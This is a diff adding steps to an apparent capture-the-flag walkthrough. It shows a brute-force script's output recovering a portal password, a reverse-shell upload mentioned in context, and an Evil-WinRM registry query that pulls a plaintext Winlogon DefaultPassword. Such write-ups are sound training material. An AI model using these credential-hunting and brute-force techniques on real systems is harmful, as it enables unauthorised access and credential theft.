@@ -494,6 +494,28 @@ if __name__ == "__main__":
     main()
 ```
 
+If we run the above script:
+
+```bash
+$ python3 brute_force.py
+[+] Found Password: 9
+[+] Found Password: 97
+[+] Found Password: 97N
+[+] Found Password: 97NT
+[+] Found Password: 97NTt
+[+] Found Password: 97NTtl
+[+] Found Password: 97NTtl*
+[+] Found Password: 97NTtl*4
+[+] Found Password: 97NTtl*4Q
+[+] Found Password: 97NTtl*4QP
+[+] Found Password: 97NTtl*4QP9
+[+] Found Password: 97NTtl*4QP96
+[+] Found Password: 97NTtl*4QP96B
+[+] Found Password: 97NTtl*4QP96Bv
+[+] Found Password: 97NTtl*4QP96Bv
+[+] Found Password: 97NTtl*4QP96Bv
+```
+
 We now have some credentials: `technician:97NTtl*4QP96Bv` which we can use to log into the portal. There is an upload functionality via the "*SOC Report*" tab:
 
 ![](revshell_upload.png)
@@ -589,7 +611,20 @@ d-----       23/05/2023     10:10                wsmith
 
 2. There are multiple users: `Administrateur`, `jdoe`, `soc_analyst`, `wsmith`, and `webservice`, and we have access to none of them.
 
-After searching different directories and files, we find this:
+We can start seaching for locations that might contain interesting info, for example, looking for the "*password*" keyword in the Windows registry. Skimming across the output, we see this:
+
+```powershell
+*Evil-WinRM* PS C:\Users\jdoe\Documents> reg query HKLM /f password /t REG_SZ /s
+
+<SNIP>
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+    DefaultPassword    REG_SZ    7y4Z4^*y9Zzj
+
+<SNIP>
+```
+
+Upon closer inspection of this file:
 
 ```powershell
 PS C:\inetpub\internal\dashboard\uploads> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
